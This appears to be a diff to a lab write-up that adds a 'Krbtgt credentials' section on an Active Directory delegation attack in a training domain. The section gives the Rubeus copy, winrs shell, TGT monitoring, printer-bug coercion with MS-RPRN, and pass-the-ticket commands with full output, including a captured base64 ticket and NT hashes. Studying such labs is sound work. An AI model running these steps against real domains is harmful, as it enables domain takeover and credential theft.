@@ -9,6 +9,7 @@ Compromise that server and get Domain Admin privileges.
 ## Index of content
   1. [Untrusted Delegation](#untrusted-delegation)
   2. [Compromise Server](#compromise-server)
+  3. [Krbtgt credentials](#krbtgt-credentials)
 
 
 ## Untrusted Delegation
@@ -394,5 +395,92 @@ SID               : S-1-5-20
            rc4_md4           892ca1e8d4343c652646b59b51779929
            rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
            rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+```
+## Krbtgt credentials
+
+Extract krbtgt credentials directly from domain controller, using a printer bug binary:
+  - From the attacker machine copy the Rebeus binary to US-web 
+  - The attacker force with webmaster credentials to US-DC connect to US-WEB with a printer bug binary
+
+```
+echo F | xcopy C:\AD\Tools\Rubeus.exe \\us-web\C$\Users\Public\Rubeus.exe
+Does \\us-web\C$\Users\Public\Rubeus.exe specify a file name
+or directory name on the target
+(F = file, D = directory)? F
+C:\AD\Tools\Rubeus.exe
+1 File(s) copied
+
+```
+Connect and start monitoring:
+```
+C:\Windows\system32>winrs -r:us-web cmd
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\webmaster>C:\Users\Public\Rubeus.exe monitor /targetuser:US-DC$ /interval:5 /nowrap
+C:\Users\Public\Rubeus.exe monitor /targetuser:US-DC$ /interval:5 /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+[*] Action: TGT Monitoring
+[*] Target user     : US-DC$
+[*] Monitoring every 5 seconds for new TGTs
+```
+Printer Debug force authentication remote from US-DC to US-WEB
+```
+PS C:\Users\studentuser17> C:\AD\Tools\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
+Attempted printer notification and received an invalid handle. The coerced authentication probably worked!
+PS C:\Users\studentuser17>
+```
+Monitoring with Rubeus:
+
+```
+[*] 2/18/2023 11:24:48 PM UTC - Found new TGT:
+
+  User                  :  US-DC$@US.TECHCORP.LOCAL
+  StartTime             :  2/18/2023 3:08:24 PM
+  EndTime               :  2/19/2023 1:08:24 AM
+  RenewTill             :  2/24/2023 8:05:09 PM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+    doIFvDCCBbigAwIBBaEDAgEWooIEtDCCBLBhggSsMIIEqKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFVUy5URUNIQ09SUC5MT0NBTKOCBGIwggReoAMCARKhAwIBAqKCBFAEggRMo3+31uKKzv1GpxAe3oIg7AyvxEOlMdvaOAj89e71ayHalNk4uGJA77vvZ/hwpMhVT8RdtJYnwWKHIpD4ZPbvuhMp1LpNxsqJBe+nn9hbaVr4xpfCy303qupLoYPE3SK/VZZS61W1AEO3LLtijyYRWq4Q4FoO/1XKLvUrJxn52inDpAuqtJofvpAwlepDY2mBG08CpSYKa9ixn8mfv3IN67RmNkpsT2gRiJ4FEVaMGyL4XofeCrRYHil5mDI9PBLdByX9JmZPglDzq6/vOj/DHf84WI2K1qBnAOF5/THEXN1Vyfm+6S9PrhvbIvOifn3h6GsoZolomatPiInBV9u7BSWxE7glddo+oPmSQJ6EGmNRDZl64C9esuIZhq8eWnHVF/P37ICCoIld8hnuMGmUfyfWxmxA/b3LjBse08IQiPcmZquJOIaUWx4Han5eajNVR1IJ2KseNzN1lXVWDFuQ1zyUgXECdTsD0WziJCjaIF6sGt4RQCOAlqr4Niy3R5/paH6Y5pTTtFRyGAOClnMCO5kHGG4Qaf8PsE0SZ3EYxfz6OP+Qz1TBPrWf90zcpQnMUdzFnHHrJA+DfIJaWyPnzvq80kdnvAmR5do92I9/xa2dH7uV9XulVpig58DH7NeMX5E4s+sf40cFN40tZnWylVS8cSU8uhBwxTWyodKoL6wIH0y16sHXNSBli6SwOayOnhx8TzbVq3MBjfyGkk9MVrwY0AxOJCtFePXH9Yavlorp1zVi7RIC2FakPWHkzLgP/JFubJ2TMJOgvkdNGA4maCcq3lSbtcq7XcxL4f0mvV7ZkGu2Qrneruy4hisfa/T+SVoNaKtAirc/msK5EXLwYGKwd/xWTbaxD0wxzA5AuFtQd9TEbr9duc9E+n2KXKsALiGeOE6tM09eiVjjjANFr5e8TDdwQNPj5khqnBhmyt+D3veKReVT8o3XMczt60h83nhUg7F7icOziNQSnkYvdBlQdf/YEydxVQdVz15fjbBsqGWtpwMC++AbrzDgplHeX7Gsd2w5PbyyQgpjSwDY9nk/KZXZdAw/omzzOywOPQ8owCeOFzmrZ/85W4NCGUlPD0WZtB5h9k+9pKnc2BnqZzwHeJ/VJdmj5Uz++XhYYLeEUBkbWUQKKT9n6xmDxSXCOeMRH612k20QZ0iyTSqgXwRaZZj4P+2aPsadYRPk21nPg6DY35mZO3w6qF5Rf+bg4RyymU3kCPheAMdotYQ1/blTkPxpMBw290fDx0MntBpny3Axh6Fn23pkhwcL18SBKZDj5OetQlmzIlNh8day40eSmfz7IR/lImse9Cp+G3qffd7Ao7EQMw8aw3unfT4jftoRsH48HFSd8lHacwH8IPpArNWN7kUURL2KlwdSh3TKayyiecrrqCGdYU1ZLx6ufjMoQAu4BQmD+FIzqLnH43MDpk3/RC/ektBz7mtOexOewNXFBJhdN6LXn82jgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCD1K8RYfzEbcKU4f4Us7TTSPJVawKCEfVp4mmFJUPTCp6ETGxFVUy5URUNIQ09SUC5MT0NBTKITMBGgAwIBAaEKMAgbBlVTLURDJKMHAwUAYKEAAKURGA8yMDIzMDIxODIzMDgyNFqmERgPMjAyMzAyMTkwOTA4MjRapxEYDzIwMjMwMjI1MDQwNTA5WqgTGxFVUy5URUNIQ09SUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRVVMuVEVDSENPUlAuTE9DQUw=
+
+[*] Ticket cache size: 1
+
+```
+Use Pass tht Ticket with rubeus and verify the imported krbtgt ticket:
+
+```
+C:\Users\studentuser17>C:\AD\Tools\Rubeus.exe ptt /ticket:doIFvDCCBbigAwIBBaEDAgEWooIEtDCCBLBhggSsMIIEqKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFVUy5URUNIQ09SUC5MT0NBTKOCBGIwggReoAMCARKhAwIBAqKCBFAEggRMo3+31uKKzv1GpxAe3oIg7AyvxEOlMdvaOAj89e71ayHalNk4uGJA77vvZ/hwpMhVT8RdtJYnwWKHIpD4ZPbvuhMp1LpNxsqJBe+nn9hbaVr4xpfCy303qupLoYPE3SK/VZZS61W1AEO3LLtijyYRWq4Q4FoO/1XKLvUrJxn52inDpAuqtJofvpAwlepDY2mBG08CpSYKa9ixn8mfv3IN67RmNkpsT2gRiJ4FEVaMGyL4XofeCrRYHil5mDI9PBLdByX9JmZPglDzq6/vOj/DHf84WI2K1qBnAOF5/THEXN1Vyfm+6S9PrhvbIvOifn3h6GsoZolomatPiInBV9u7BSWxE7glddo+oPmSQJ6EGmNRDZl64C9esuIZhq8eWnHVF/P37ICCoIld8hnuMGmUfyfWxmxA/b3LjBse08IQiPcmZquJOIaUWx4Han5eajNVR1IJ2KseNzN1lXVWDFuQ1zyUgXECdTsD0WziJCjaIF6sGt4RQCOAlqr4Niy3R5/paH6Y5pTTtFRyGAOClnMCO5kHGG4Qaf8PsE0SZ3EYxfz6OP+Qz1TBPrWf90zcpQnMUdzFnHHrJA+DfIJaWyPnzvq80kdnvAmR5do92I9/xa2dH7uV9XulVpig58DH7NeMX5E4s+sf40cFN40tZnWylVS8cSU8uhBwxTWyodKoL6wIH0y16sHXNSBli6SwOayOnhx8TzbVq3MBjfyGkk9MVrwY0AxOJCtFePXH9Yavlorp1zVi7RIC2FakPWHkzLgP/JFubJ2TMJOgvkdNGA4maCcq3lSbtcq7XcxL4f0mvV7ZkGu2Qrneruy4hisfa/T+SVoNaKtAirc/msK5EXLwYGKwd/xWTbaxD0wxzA5AuFtQd9TEbr9duc9E+n2KXKsALiGeOE6tM09eiVjjjANFr5e8TDdwQNPj5khqnBhmyt+D3veKReVT8o3XMczt60h83nhUg7F7icOziNQSnkYvdBlQdf/YEydxVQdVz15fjbBsqGWtpwMC++AbrzDgplHeX7Gsd2w5PbyyQgpjSwDY9nk/KZXZdAw/omzzOywOPQ8owCeOFzmrZ/85W4NCGUlPD0WZtB5h9k+9pKnc2BnqZzwHeJ/VJdmj5Uz++XhYYLeEUBkbWUQKKT9n6xmDxSXCOeMRH612k20QZ0iyTSqgXwRaZZj4P+2aPsadYRPk21nPg6DY35mZO3w6qF5Rf+bg4RyymU3kCPheAMdotYQ1/blTkPxpMBw290fDx0MntBpny3Axh6Fn23pkhwcL18SBKZDj5OetQlmzIlNh8day40eSmfz7IR/lImse9Cp+G3qffd7Ao7EQMw8aw3unfT4jftoRsH48HFSd8lHacwH8IPpArNWN7kUURL2KlwdSh3TKayyiecrrqCGdYU1ZLx6ufjMoQAu4BQmD+FIzqLnH43MDpk3/RC/ektBz7mtOexOewNXFBJhdN6LXn82jgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCD1K8RYfzEbcKU4f4Us7TTSPJVawKCEfVp4mmFJUPTCp6ETGxFVUy5URUNIQ09SUC5MT0NBTKITMBGgAwIBAaEKMAgbBlVTLURDJKMHAwUAYKEAAKURGA8yMDIzMDIxODIzMDgyNFqmERgPMjAyMzAyMTkwOTA4MjRapxEYDzIwMjMwMjI1MDQwNTA5WqgTGxFVUy5URUNIQ09SUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRVVMuVEVDSENPUlAuTE9DQUw=
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+```
+validate:
+```
+
+```
+Use DCSync to dump all credentials from US-DC:
+
+```
 
 ```
